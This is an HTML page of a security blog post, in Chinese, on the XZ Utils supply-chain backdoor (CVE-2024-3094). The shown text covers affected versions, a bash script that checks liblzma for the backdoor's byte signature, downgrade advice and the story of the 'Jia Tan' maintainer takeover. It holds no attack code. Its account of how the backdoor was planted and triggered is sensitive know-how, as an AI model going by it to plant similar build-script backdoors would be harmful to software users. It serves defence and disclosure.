<!DOCTYPE html>
<html itemscope itemtype="http://schema.org/WebPage" lang="en">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
    <meta name="robots" content="noodp" />
    <title>XZ Utils Backdoor 事件分析汇总 - Xavier&#39;s Blog</title><meta name="author" content="Xavier">
<meta name="description" content="Xavier&#39;s Blog，一个安全工作者的个人空间"><meta name="keywords" content='漏洞分析'>
  <meta itemprop="name" content="XZ Utils Backdoor 事件分析汇总">
  <meta itemprop="description" content="Xavier&#39;s Blog，一个安全工作者的个人空间">
  <meta itemprop="datePublished" content="2024-04-06T17:05:44+00:00">
  <meta itemprop="dateModified" content="2024-04-06T17:05:44+00:00">
  <meta itemprop="wordCount" content="10551">
  <meta itemprop="keywords" content="漏洞分析"><meta property="og:url" content="http://localhost:1313/posts/xz-backdoor-analysis/">
  <meta property="og:site_name" content="Xavier&#39;s Blog">
  <meta property="og:title" content="XZ Utils Backdoor 事件分析汇总">
  <meta property="og:description" content="Xavier&#39;s Blog，一个安全工作者的个人空间">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-04-06T17:05:44+00:00">
    <meta property="article:modified_time" content="2024-04-06T17:05:44+00:00">
    <meta property="article:tag" content="漏洞分析">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="XZ Utils Backdoor 事件分析汇总">
  <meta name="twitter:description" content="Xavier&#39;s Blog，一个安全工作者的个人空间">
<meta name="application-name" content="Xavier&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Xavier&#39;s Blog"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/xz-backdoor-analysis/" title="XZ Utils Backdoor 事件分析汇总 - Xavier&#39;s Blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/provinggrounds-butch/" title="ProvingGrounds Butch Writeup" /><link rel="next" type="text/html" href="http://localhost:1313/posts/2024-hackingclub-beijing/" title="2024 HackingClub北京站沙龙分享" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/xz-backdoor-analysis/index.md" title="XZ Utils Backdoor 事件分析汇总 - Xavier's Blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "headline": "XZ Utils Backdoor 事件分析汇总",
    "inLanguage": "en",
    "mainEntityOfPage": {
      "@type": "WebPage",
      "@id": "http:\/\/localhost:1313\/posts\/xz-backdoor-analysis\/"
    },"genre": "posts","keywords": "漏洞分析","wordcount":  10551 ,
    "url": "http:\/\/localhost:1313\/posts\/xz-backdoor-analysis\/","datePublished": "2024-04-06T17:05:44+00:00","dateModified": "2024-04-06T17:05:44+00:00","publisher": {
      "@type": "Organization",
      "name": ""},"author": {
        "@type": "Person",
        "name": "Xavier"
      },"description": ""
  }
  </script><script src="/js/head/color-scheme.min.js"></script></head>
  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
  <div class="header-wrapper">
    <div class="header-title">
      <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
    <nav>
      <ul class="menu"><li class="menu-item">
              <a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item">
              <a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item">
              <a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item">
              <a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item">
              <a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item">
              <a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
            </a>
            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
            </a>
            <span class="search-button search-loading" id="search-loading-desktop">
              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
            </span>
          </li><li class="menu-item theme-switch" title="切换主题">
          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
        </li></ul>
    </nav>
  </div>
</header><header class="mobile animate__faster" id="header-mobile">
  <div class="header-container">
    <div class="header-wrapper">
      <div class="header-title">
        <a href="/" title="Xavier&#39;s Blog"><span class="header-title-text">Xavier&#39;s Blog</span></a><span class="header-subtitle">一个安全工作者</span></div>
      <div class="menu-toggle" id="menu-toggle-mobile">
        <span></span><span></span><span></span>
      </div>
    </div>
    <nav>
      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
            <div class="search mobile" id="search-mobile">
              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
              </a>
              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
              </a>
              <span class="search-button search-loading" id="search-loading-mobile">
                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
              </span>
            </div>
            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
              取消
            </a>
          </li><li class="menu-item"><a class="menu-link" href="/posts/"><i class="fa-solid fa-archive fa-fw fa-sm" aria-hidden="true"></i> Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/"><i class="fa-solid fa-th fa-fw fa-sm" aria-hidden="true"></i> Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/"><i class="fa-solid fa-tags fa-fw fa-sm" aria-hidden="true"></i> Tags</a></li><li class="menu-item"><a class="menu-link" href="/friends/"><i class="fa-solid fa-user-group fa-fw fa-sm" aria-hidden="true"></i> Friends</a></li><li class="menu-item"><a class="menu-link" href="/tools/"><i class="fa-solid fa-screwdriver-wrench fa-fw fa-sm" aria-hidden="true"></i> Tools</a></li><li class="menu-item"><a class="menu-link" href="/about/"><i class="fa-solid fa-circle-info fa-fw fa-sm" aria-hidden="true"></i> About</a></li><li class="menu-item menu-system">
          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
      </ul>
    </nav>
  </div>
</header><div class="search-dropdown desktop">
    <div id="search-dropdown-desktop"></div>
  </div>
  <div class="search-dropdown mobile">
    <div id="search-dropdown-mobile"></div>
  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>

  <article class="page single">
    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>XZ Utils Backdoor 事件分析汇总</span>
      </h1></div><div class="post-meta">
      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="/resource/friends/me.png" alt="Xavier" data-title="Xavier" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;Xavier</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" class="post-category" title="分类 - 漏洞分析"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 漏洞分析</a>&ensp;<a href="/categories/%E8%81%8C%E4%B8%9A%E7%94%9F%E6%B6%AF/" class="post-category" title="分类 - 职业生涯"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> 职业生涯</a></span></div><div class="post-meta-line"><span title="发布于 2024-04-06 17:05:44"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2024-04-06">2024-04-06</time></span>&nbsp;<span title="10551 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 10600 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 22 分钟</span>&nbsp;</div>
    </div><div class="details toc" id="toc-static" data-kept="false">
        <div class="details-summary toc-title">
          <span>目录</span>
          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
        </div>
        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#xz-utilѕ-工具库-恶意后门植入漏洞-cve-2024-3094">XZ Utilѕ 工具库 恶意后门植入漏洞 (CVE-2024-3094)</a></li>
    <li><a href="#漏洞介绍">漏洞介绍</a>
      <ul>
        <li><a href="#漏洞信息">漏洞信息</a></li>
        <li><a href="#受影响组件和系统">受影响组件和系统</a></li>
        <li><a href="#漏洞排查">漏洞排查</a></li>
        <li><a href="#缓解措施">缓解措施</a></li>
      </ul>
    </li>
    <li><a href="#背后故事">背后故事</a></li>
    <li><a href="#技术细节">技术细节</a>
      <ul>
        <li><a href="#stage-0">Stage 0</a></li>
        <li><a href="#stage-1">Stage 1</a></li>
        <li><a href="#stage-2">Stage 2</a>
          <ul>
            <li><a href="#扩展-机制">扩展 机制</a></li>
            <li><a href="#目标选择">目标选择</a></li>
            <li><a href="#后门提取">后门提取</a></li>
          </ul>
        </li>
        <li><a href="#o二进制分析">.o二进制分析</a></li>
        <li><a href="#后门设计分析">后门设计分析</a></li>
        <li><a href="#payload-分析">payload 分析</a></li>
        <li><a href="#xz-bits">xz bits</a></li>
        <li><a href="#人员分析">人员分析</a></li>
      </ul>
    </li>
    <li><a href="#漏洞利用">漏洞利用</a></li>
    <li><a href="#后续影响">后续影响</a></li>
    <li><a href="#参考链接">参考链接</a></li>
  </ul>
</nav></div>
      </div><div class="content" id="content" data-end-flag="It&#39;s end."><h2 id="xz-utilѕ-工具库-恶意后门植入漏洞-cve-2024-3094" class="heading-element"><span>XZ Utilѕ 工具库 恶意后门植入漏洞 (CVE-2024-3094)</span>
  <a href="#xz-util%d1%95-%e5%b7%a5%e5%85%b7%e5%ba%93-%e6%81%b6%e6%84%8f%e5%90%8e%e9%97%a8%e6%a4%8d%e5%85%a5%e6%bc%8f%e6%b4%9e-cve-2024-3094" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><h2 id="漏洞介绍" class="heading-element"><span>漏洞介绍</span>
  <a href="#%e6%bc%8f%e6%b4%9e%e4%bb%8b%e7%bb%8d" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>XZ是类Unix操作系统上的一种高压缩比的无损数据压缩格式，由 Tukaani 项目开发，通常与gzibzip2 等其他常见数据压缩格式进行比较，它帮助将大文件格式压缩（然后解压缩） 为更小 更易管理的大小， 以便通过文件传输进行共享。</p>
<p>XZ Utils是一个命令行工具，包含XZ文件和liblzma的压缩和解压缩功能。 liblzma 是一个用于处理 XZ 压缩格式的开源软件库，是一种用于数据压缩的类似zlib的API，并且还支持旧版 .lzma 格式。</p>
<p>3月29日，有开发人员在安全邮件列表上发帖称，他在调查SSH性能问题时发现了涉及XZ包中的供应链攻击，进一步溯源发现SSH使用的上游liblzma库被植入了后门代码，恶意代码可能允许攻击者通过后门版本的SSH非授权获取系统的访问权限。恶意代码修改了liblzma代码中的函数，该代码是XZ Utils软件包的一部分，链接到 XZ 库的任何软件都可以使用此修改后的代码，并允许拦截和修改与该库一起使用的数据。</p>
<h3 id="漏洞信息" class="heading-element"><span>漏洞信息</span>
  <a href="#%e6%bc%8f%e6%b4%9e%e4%bf%a1%e6%81%af" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><table>
  <thead>
      <tr>
          <th>&mdash;&mdash;</th>
          <th>&mdash;&mdash;</th>
          <th>&mdash;&mdash;</th>
          <th>&mdash;&mdash;</th>
      </tr>
  </thead>
  <tbody>
      <tr>
          <td><strong>漏洞名称</strong></td>
          <td>XZ Utilѕ工具库恶意后门植入漏洞</td>
          <td><strong>公开时间</strong></td>
          <td>2024-03-29</td>
      </tr>
      <tr>
          <td><strong>CVE编号</strong></td>
          <td>CVE-2024-3094</td>
          <td><strong>漏洞评级</strong></td>
          <td>高危</td>
      </tr>
      <tr>
          <td><strong>事件类型</strong></td>
          <td>供应链攻击、 后门</td>
          <td><strong>技术类型</strong></td>
          <td>内嵌恶意代码</td>
      </tr>
      <tr>
          <td><strong>厂商</strong></td>
          <td>开源项目 Tukaani Project</td>
          <td><strong>产品</strong></td>
          <td>xz</td>
      </tr>
      <tr>
          <td><strong>威胁状态</strong></td>
          <td>POC/EXP已公开，在野利用已发现，技术细节部分公开</td>
          <td></td>
          <td></td>
      </tr>
      <tr>
          <td><strong>影响版本</strong></td>
          <td>xz == 5.6.0 、xz == 5.6.1 、liblzma== 5.6.0 、liblzma== 5.6.1</td>
          <td></td>
          <td></td>
      </tr>
  </tbody>
</table>
<h3 id="受影响组件和系统" class="heading-element"><span>受影响组件和系统</span>
  <a href="#%e5%8f%97%e5%bd%b1%e5%93%8d%e7%bb%84%e4%bb%b6%e5%92%8c%e7%b3%bb%e7%bb%9f" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>xz 和 liblzma 5.6.0~5.6.1 版本，可能包括的发行版 / 包管理系统有：</p>
<ul>
<li>Fedora 41 / Fedora Rawhide</li>
<li>Debian Sid 非稳定的测试版 5.5.1alpha-0.1 到 5.6.1-1</li>
<li>Alpine Edge</li>
<li>x64 架构的 homebrew</li>
<li>滚动更新的发行版，包括 Arch Linux / OpenSUSE Tumbleweed</li>
</ul>
<p>详情可参考： <a href="https://repology.org/project/xz/versions"target="_blank" rel="external nofollow noopener noreferrer">https://repology.org/project/xz/versions</a></p>
<p>以下为正在更新的操作系统和发行版列表， 它们已经报告是否受到这个漏洞的影响。</p>
<p><a class="lightgallery" href="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240402162435877.png?size=large" data-thumbnail="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240402162435877.png?size=small" data-sub-html="<h2>image-20240402162435877</h2>"><img loading="lazy" src="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240402162435877.png" alt="image-20240402162435877" srcset="/posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240402162435877.png?size=small, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240402162435877.png?size=medium 1.5x, /posts/xz-backdoor-analysis/resource/xz%E5%BA%93%E6%81%B6%E6%84%8F%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E4%BA%8B%E4%BB%B6.assets/image-20240402162435877.png?size=large 2x" data-title="image-20240402162435877" style="--width: 556px;--aspect-ratio: 556 / 632;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></a></p>
<p>查看受影响的开源操作系统可参考： <a href="https://repology.org/project/xz/versions"target="_blank" rel="external nofollow noopener noreferrer">https://repology.org/project/xz/versions</a></p>
<p>如果您的系统使用 systemd 启动 OpenSSH 服务器，您的 SSH 认证过程可能被攻击。</p>
<p>非 x64 (amd64) 架构的系统不受影响。</p>
<h3 id="漏洞排查" class="heading-element"><span>漏洞排查</span>
  <a href="#%e6%bc%8f%e6%b4%9e%e6%8e%92%e6%9f%a5" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>通过如下命令查看系统本地是否安装了受影响的 XZ：</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">$ xz --version
</span></span><span class="line"><span class="cl">xz <span class="o">(</span>XZ Utils<span class="o">)</span> 5.6.1
</span></span><span class="line"><span class="cl">liblzma 5.6.1</span></span></code></pre></td></tr></table>
</div>
</div><p>自查脚本如下：</p>
<p>在系统中执行脚本</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl"><span class="cp">#! /bin/bash
</span></span></span><span class="line"><span class="cl"><span class="cp"></span><span class="nb">set</span> -eu
</span></span><span class="line"><span class="cl"><span class="c1"># find path to liblzma used by sshd</span>
</span></span><span class="line"><span class="cl"><span class="nv">path</span><span class="o">=</span><span class="s2">&#34;</span><span class="k">$(</span>ldd <span class="k">$(</span>which sshd<span class="k">)</span> <span class="p">|</span> grep liblzma <span class="p">|</span> grep -o <span class="s1">&#39;/[^ ]*&#39;</span><span class="k">)</span><span class="s2">&#34;</span>
</span></span><span class="line"><span class="cl"><span class="c1"># does it even exist?</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> <span class="s2">&#34;</span><span class="nv">$path</span><span class="s2">&#34;</span> <span class="o">==</span> <span class="s2">&#34;&#34;</span> <span class="o">]</span>
</span></span><span class="line"><span class="cl"><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> probably not vulnerable
</span></span><span class="line"><span class="cl"><span class="nb">exit</span>
</span></span><span class="line"><span class="cl"><span class="k">fi</span>
</span></span><span class="line"><span class="cl"><span class="c1"># check for function signature</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> hexdump -ve <span class="s1">&#39;1/1 &#34;%.2x&#34;&#39;</span> <span class="s2">&#34;</span><span class="nv">$path</span><span class="s2">&#34;</span> <span class="p">|</span> grep -q
</span></span><span class="line"><span class="cl">f30f1efa554889f54c89ce5389fb81e7000000804883ec28488954241848894c2410
</span></span><span class="line"><span class="cl"><span class="k">then</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> probably vulnerable
</span></span><span class="line"><span class="cl"><span class="k">else</span>
</span></span><span class="line"><span class="cl"><span class="nb">echo</span> probably not vulnerable
</span></span><span class="line"><span class="cl"><span class="k">fi</span></span></span></code></pre></td></tr></table>
</div>
</div><h3 id="缓解措施" class="heading-element"><span>缓解措施</span>
  <a href="#%e7%bc%93%e8%a7%a3%e6%8e%aa%e6%96%bd" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h3><p>目前官方尚无最新版本， 需对软件版本进行降级 5.4.X， 请关注官方新版本发布并及时更新。</p>
<p>Fedora Linux 40 用户需 xz 回退到 5.4.x 版本可参考：</p>
<p><a href="https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users"target="_blank" rel="external nofollow noopener noreferrer">https://www.redhat.com/en/blog/urgent-security-alert-fedora-41-and-rawhide-users</a></p>
<p><a href="https://bodhi.fedoraproject.org/updates/FEDORA-2024-d02c7bb266"target="_blank" rel="external nofollow noopener noreferrer">https://bodhi.fedoraproject.org/updates/FEDORA-2024-d02c7bb266</a></p>
<h2 id="背后故事" class="heading-element"><span>背后故事</span>
  <a href="#%e8%83%8c%e5%90%8e%e6%95%85%e4%ba%8b" class="heading-mark">
    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
  </a>
</h2><p>故事大概是：</p>
<p>OpenSSH依赖一个名为liblzma(xz)的小众开源压缩库，攻击者虚构了一个名为&quot;Jia Tan&quot;的开发者身份，从2021年10月开始为xz项目积极做开发维护贡献，逐渐获得信任。</p>
<p>最终接管了维护工作后，在构建脚本中逐步加入一个复杂隐蔽并复杂混淆的后门，而且是几个月内慢慢的添加所有组件，组合成了完整的后门，接着还联系Linux发行版维护人员，试图让带后门的xz库被打包分发给所有用户，直到微软员工Andres Freund因调查SSH延迟问题发现了此事。</p>
<p>发现也很巧合，Andres Freund在分析一台运行Debian Sid的Linux设备SSH登录速度过慢问题时（有500毫秒的延迟和大量的CPU消耗问题，而且他在使用“Valgrind”工具进行分析和内存调试时遇到了许多报错，也促使他有进一步调查的想法），最终发现了该后门。而且RCE也非常巧妙，将有效负载隐藏到将要发送到 SSH 的专门制作的密钥里。</p>
